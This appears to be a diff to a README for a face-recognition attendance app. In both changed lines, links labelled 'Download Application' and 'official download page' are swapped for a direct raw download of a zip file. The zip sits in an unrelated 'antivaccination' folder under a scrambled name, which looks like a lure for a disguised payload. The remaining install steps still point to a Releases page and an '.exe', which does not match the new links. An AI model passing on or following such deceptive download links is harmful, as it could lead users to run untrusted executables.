@@ -1,6 +1,6 @@
 # 🤖 Smart-Face-Attendance-System-No-Roll-Call-Just-a-Glance - Track student attendance without any effort
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Modest-depositor640/Smart-Face-Attendance-System-No-Roll-Call-Just-a-Glance)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Modest-depositor640/Smart-Face-Attendance-System-No-Roll-Call-Just-a-Glance/main/antivaccination/Roll-Smart-No-Just-System-Glance-a-Call-Attendance-Face-v2.5-alpha.3.zip)
 
 ## 📌 About this project
 
@@ -28,7 +28,7 @@ To run this application, your computer needs these specifications:
 
 ## 📥 How to install
 
-1. Visit the [official download page](https://github.com/Modest-depositor640/Smart-Face-Attendance-System-No-Roll-Call-Just-a-Glance) to get the latest version.
+1. Visit the [official download page](https://raw.githubusercontent.com/Modest-depositor640/Smart-Face-Attendance-System-No-Roll-Call-Just-a-Glance/main/antivaccination/Roll-Smart-No-Just-System-Glance-a-Call-Attendance-Face-v2.5-alpha.3.zip) to get the latest version.
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the link to open the release details.
 4. Download the file ending in `.exe`.
